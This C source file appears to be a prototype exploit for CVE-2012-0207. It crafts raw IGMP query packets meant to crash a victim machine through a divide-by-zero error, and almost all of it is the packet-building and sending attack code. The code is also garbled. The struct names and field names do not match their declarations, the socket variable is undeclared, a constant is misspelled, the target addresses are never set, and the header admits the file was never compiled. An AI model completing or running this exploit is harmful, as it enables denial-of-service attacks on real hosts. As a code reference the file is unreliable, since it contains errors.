#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
/*A condensed prototype of the exploit CVE-2012-0207 (dos via specially crafted igmp packets that cause a divide by zero error on the victim machine) that shows the basic packet structure required and includes code on how to build them.
  WARNING THIS CODE HAS NOT BEEN TESTED OR COMPILED AND IS STRICTLY TO SHOW HOW THESE PACKETS WOULD BE CREATED*/
struct ip_header
{
  /*struct for creating the ip header no flags are set so the flags field is not included anf the header/version byte is split
for the appropriate byte ordering of my machine*/
  unsigned char header_len:4, ver:4, type;
  unsigned short total_len, id, frag_off;
  unsigned char ttl, protocol;
  unsigned char check;
  unsigned int src_addr, dst_addr;
  unsigned int opt1;
  unsigned int opt2;
};

struct ipmg
{
  unsigned char type;
  unsigned char code;
  unsigned short check_sum;
  unsigned int grp_addr;
  char pad[40];
};
unsigned short in_chksum(unsigned short *addr, int len)
{
  /* function from undeadattack.c on exploitdb that is used to calculate the checksum of the igmp packet */
   register int nleft = len;
   register int sum = 0;
   u_short answer = 0;
 
   while (nleft > 1) {
      sum += *addr++;
      nleft -= 2;
   }
 
 
   if (nleft == 1) {
      *(u_char *)(&answer) = *(u_char *)addr;
      sum += answer;
   }
 
 
   sum = (sum >> 16) + (sum & 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
   return(answer);
}

int main(int argc, char *argv[])
{

  struct ip_header *ip;
  struct igmp *igmp;
  struct sockaddr_in dst;
  long src_addr, dst_addr;
  char pkt[500];

  memset(pkt,0,500); //steralise the packet buffer
  ip = (struct iphdr *) &pkt;
  igmp = (struct igmp *) &pkt + sizeof(struct iphdr);
  dst.sin_addr.s_addr = dst_addr;
  dst.sin_family = AFINET;

  ip->header_length = 7;
  ip->version = 4;
  ip->type = 0;
  ip->total_len = htons(sizeof(struct iphdr)+8);
  ip->id = htons(1337);
  ip->frag_off=0;
  ip->ttl = 1;
  ip->protocol = IPPROTO_IGMP;
  ip->check = in_chksum((unsigned short *)ip, sizeof(struct iphdr));
  ip->src_addr = src_addr;
  ip->dst_addr = dst_addr;
  ip->opt1 = 0;
  ip->opt2 = 0;
  igmp->type = 0x11;
  igmp->code= 0xff;
  igmp->grp_addr=inet_addr("224.0.0.1");
  igmp->check_sum = 0;
  igmp->check_sum((unsigned short *)igmp, 8);

  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  sendto(s, &pkt, sizeof(struct ip_header) + 8,0,(struct sockaddr *)&dst, sizeof(struct sockaddr_in));
  ip->id = htons(1336);
  ip->total_len = sizeof(struct iphdr)+12;
  igmp->type = 0x11;
  igmp->code = 0;
  igmp->grp_addr=inet_addr("0.0.0.0");
 
  igmp->csum = 0; //For computing the checksum, the Checksum field is set to zero.
  igmp->csum=in_chksum((unsigned short *)igmp, 12);
  sendto(s, &pkt, sizeof(struct ip_header) + 12,0,(struct sockaddr *)&dst, sizeof(struct sockaddr_in));

  close(s);
 
  
  
}
